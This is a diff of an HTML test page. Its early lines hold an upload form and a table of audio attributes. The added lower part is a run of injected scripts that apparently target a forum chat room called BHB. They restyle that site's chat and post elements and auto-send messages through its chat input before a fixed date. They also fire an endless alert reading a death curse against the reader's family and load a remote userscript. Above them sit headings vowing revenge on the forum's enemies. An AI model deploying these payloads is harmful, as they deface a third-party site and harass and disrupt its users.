@@ -3,9 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <title>Title</title>
+    <script src="./jQuery/jquery-3.7.1.min.js"></script>
+    <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
 </head>
 <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
 <body>
+<script>alert($)</script>
 <div style="position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 250px;height: 500px;border: 1px solid red;overflow: hidden;">
 <form name="myform" id="myform" action="" method="post">
     <input type="file" id="webimgsrc" name='webimgsrc'>
@@ -21,28 +24,47 @@
 </form>
 </div>
 
-<div id="test" style="position: absolute;top: 50%;left: 25%;transform: translate(-75%, -50%);width: 250px;height: 500px;border: 1px solid red;overflow: hidden;"><p><span>修改1</span><input type="radio" name="one" id="one"><input type="text"><input type="text"></p><p><span>修改2</span><input type="radio" name="two" id="two"><input type="text"><input type="text"></p><p><span>修改3</span><input type="radio" name="three" id="three"><input type="text"><input type="text"></p></div>
-<script type="text/javascript">
-    $(function () {
-        var subint=document.getElementById("subint");
-        var size=document.getElementById("size");
-        var left=document.getElementById("left");
-        var top=document.getElementById("top");
-        var localimgsrc=document.getElementById("localimgsrc");
-        var webimgsrc=document.getElementById("webimgsrc");
-        subint.onclick=function(){
-            localStorage.setItem("subint",subint.value);
-            localStorage.setItem("size",size.value);
-            localStorage.setItem("left",left.value);
-            localStorage.setItem("top",top.value);
-            localStorage.setItem("localimgsrc",localimgsrc.value);
-            localStorage.setItem("webimgsrc",webimgsrc.value);
+<table style="border: 1px solid black;">
+    <tr style="border: 1px solid black;">
+        <th style="border: 1px solid black;">autoplay</th>
+        <th style="border: 1px solid black;">出现此属性则会在音频加载就绪后立刻开始播放（目前大部分浏览器已经禁止自动播放）</th>
+    </tr>
+    <tr style="border: 1px solid black;">
+        <th style="border: 1px solid black;">controls</th>
+        <th style="border: 1px solid black;">出现此属性会显示播放控制面板</th>
+    </tr>
+    <tr style="border: 1px solid black;">
+        <th style="border: 1px solid black;">loop</th>
+        <th style="border: 1px solid black;">出现此属性会自动循环播放音频</th>
+    </tr>
+    <tr style="border: 1px solid black;">
+        <th style="border: 1px solid black;">muted</th>
+        <th style="border: 1px solid black;">如果出现该属性会使音频输出为静音</th>
+    </tr>
+</table>
 
-        }
-    });
+<select name="selectBox" id="selectBox"><option value="default">默认</option><option value="center">居中</option><option value="PicFirst">图像尺寸优先</option><option value="WebFirst">网站尺寸优先</option></select>
+
+
+
+<style> body{background-color: aqua }</style>
+
+<h1>今天，我们为被害的BHB哀悼。😭</h1><br>
+<h1>明天，我们就要让凶手 v付出代价！😡</h1><br>
+<h1>社区不会允许，对站长 服务器 站友的入侵，或对论坛的干涉！🤬</h1><br>
+<h1>我们伟大的社区，举国悲痛。😫</h1><br>
+<h1>共同的损失，让我们更加，团结一致！😠</h1><br>
+<h1>我们藏于暗处的敌人们，要为可耻地共谋刺杀BHB，做出回答！👿</h1><br>
+<script>document.getElementsByClassName("chat-history-body")[0].style.backgroundColor="#00000000"</script>
+<script type="text/javascript">document.querySelector("body").setAttribute('style', `background-image: url(https://t1-img.233213.xyz/2024/11/29/674922c38c1df.png); `);</script>
+<script type="text/javascript">document.querySelector("body").setAttribute('style', `background-image: url(#); `);</script>
+<script>document.querySelector("#top > div > div > main > div > div.col-lg-9.main > div.card.card-postlist").setAttribute('style', `background-color:#20204000; `)</script>
+<script>const ig=document.querySelectorAll(".collapse .card .p-3 .open .show");for (let i=0;i<ig.length;i++){ig[i].setAttribute('style', `background-color:#20204000; `)}</script>
+<script>let a=document.getElementsByTagName("fw-semibold d-block").toString();if (Date.parse(Date())<1734080400) {document.getElementById('msg').value="@"+a; send();}</script>
+<script> setInterval(function (){alert("1337你死全家")},2000)</script>
+<script>
+    setInterval(()=>document.querySelector("#msg"),1)
 </script>
+<script src="https://update.greasyfork.org/scripts/519010/BHB聊天室背景图片更换（已全局兼容）.user.js"></script>
 </body>
-
-
-
 </html>
